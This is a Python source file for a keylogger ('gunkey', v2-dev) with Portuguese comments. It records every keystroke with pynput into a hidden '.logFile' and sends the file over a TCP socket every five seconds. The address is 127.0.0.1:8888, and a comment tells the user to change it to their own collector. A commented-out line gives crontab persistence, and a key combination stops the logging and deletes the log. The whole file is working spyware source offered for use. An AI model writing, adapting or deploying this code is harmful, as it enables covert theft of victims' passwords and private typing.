#!/usr/bin/env python
version = "v2-dev"

from pynput.keyboard import Listener, Key
import threading
import socket
import time
import os

pwd = os.popen('find / -name gunkey.py 2>/dev/null').read()
pwd = pwd.splitlines()
#os.system(f'echo "*/15 * * * * /usr/bin/python3 {pwd[0]}" | crontab -') # Para fazer uma persistencia pelo crontab

running = True
ctrl_pressed = False
alt_pressed = False
esc_pressed = False

def on_key_press(key):
    global running, ctrl_pressed, alt_pressed, esc_pressed
    if running:
        if key == Key.ctrl:
            ctrl_pressed = True
        elif key == Key.alt:
            alt_pressed = True
        elif key == Key.esc:
            esc_pressed = True

        if ctrl_pressed and alt_pressed and esc_pressed:
            running = False
            time.sleep(30)
            os.system('rm .logFile')
        else:
            trocar_tecla = {
                "Key.space": " ",
                "Key.backspace": "<-",
                "Key.ctrlc": "",
                "Key.shift": "^",
                "<65437>": "5",
                "Key.shift_r": "^",
                "Key.caps_lock": "!!",
                "Key.enter": "\n",
                "<65439>": ","
            }
            tecla_salva = str(key).replace("'", "")
            for tecla in trocar_tecla:
                tecla_salva = tecla_salva.replace(tecla, trocar_tecla[tecla])
            with open('.logFile', "a") as f:
                f.write(tecla_salva)

def on_key_release(key):
    global ctrl_pressed, alt_pressed, esc_pressed
    if key == Key.ctrl:
        ctrl_pressed = False
    elif key == Key.alt:
        alt_pressed = False
    elif key == Key.esc:
        esc_pressed = False

def keylogger():
    with open('.logFile', "a") as f:
        f.write(f'\n== {time.strftime("%d/%m/%y | %H:%M:%S")} ==\n')

    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

def send_data():
    while running == True:
        try:
            with open('.logFile', 'rb') as f:
                file_data = f.read()

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 8888)) #ALTERAR O IP AQUI
            s.sendall(file_data)
            s.close()

            time.sleep(5)
        except FileNotFoundError:
            print("Arquivo .logFile não encontrado.")

keylogger_thread = threading.Thread(target=keylogger)
keylogger_thread.start()

send_data_thread = threading.Thread(target=send_data)
send_data_thread.start()

keylogger_thread.join()
send_data_thread.join()
